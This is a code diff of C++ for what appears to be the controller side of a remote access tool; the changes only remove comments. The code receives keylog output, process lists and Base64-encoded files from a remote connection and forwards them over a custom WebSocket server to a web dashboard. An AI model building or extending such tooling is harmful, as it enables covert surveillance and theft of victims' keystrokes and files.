@@ -25,7 +25,6 @@ atomic<bool> isWebConnected(false);
 vector<string> discoveredServers;
 mutex wsMutex;
 
-// --- JSON ESCAPE (QUAN TRỌNG CHO KEYLOG & PATH) ---
 string escapeJsonString(const string &input)
 {
     ostringstream ss;
@@ -101,7 +100,7 @@ void sendWebFrame(string message)
         return;
 
     vector<unsigned char> frame;
-    frame.push_back(0x81); // Text frame
+    frame.push_back(0x81); 
 
     if (message.length() <= 125)
     {
@@ -114,7 +113,7 @@ void sendWebFrame(string message)
         frame.push_back(message.length() & 0xFF);
     }
     else
-    { // 64-bit support
+    {
         frame.push_back(127);
         unsigned long long len = message.length();
         for (int i = 7; i >= 0; i--)
@@ -237,14 +236,11 @@ void ratReceiverThread()
         }
         else if (line.rfind("FILEDATA ", 0) == 0)
         {
-            // Xử lý download file
             try
             {
                 size_t spacePos = line.find(' ');
                 string sizeStr = line.substr(spacePos + 1);
                 cout << "[FILEDATA] Received header, size: " << sizeStr << " bytes" << endl;
-
-                // Dòng tiếp theo là Base64 data
                 string base64Data = receiveRatLine();
                 cout << "[FILEDATA] Received base64 data, length: " << base64Data.length() << " chars" << endl;
 
@@ -259,19 +255,15 @@ void ratReceiverThread()
         }
         else
         {
-            // --- LOGIC MỚI: Kiểm tra gói tin Chat ---
             if (line.rfind("CHAT:", 0) == 0)
             {
-                // Server gửi: "CHAT:[Server]: Hello"
-                string content = line.substr(5); // Bỏ chữ "CHAT:"
+                string content = line.substr(5); 
                 string safeContent = escapeJsonString(content);
-                // Gửi type riêng là "CHAT"
                 string json = "{\"type\":\"CHAT\", \"data\":\"" + safeContent + "\"}";
                 sendWebFrame(json);
             }
             else
             {
-                // Các Log thông thường (Keylog, Process list...)
                 string safeLine = escapeJsonString(line);
                 string json = "{\"type\":\"LOG\", \"data\":\"" + safeLine + "\"}";
                 sendWebFrame(json);
@@ -397,7 +389,7 @@ void webSocketServer()
                     else if (payloadLen == 127)
                     {
                         break;
-                    } // Ignore huge frames
+                    } 
 
                     unsigned char maskKey[4];
                     if (masked)
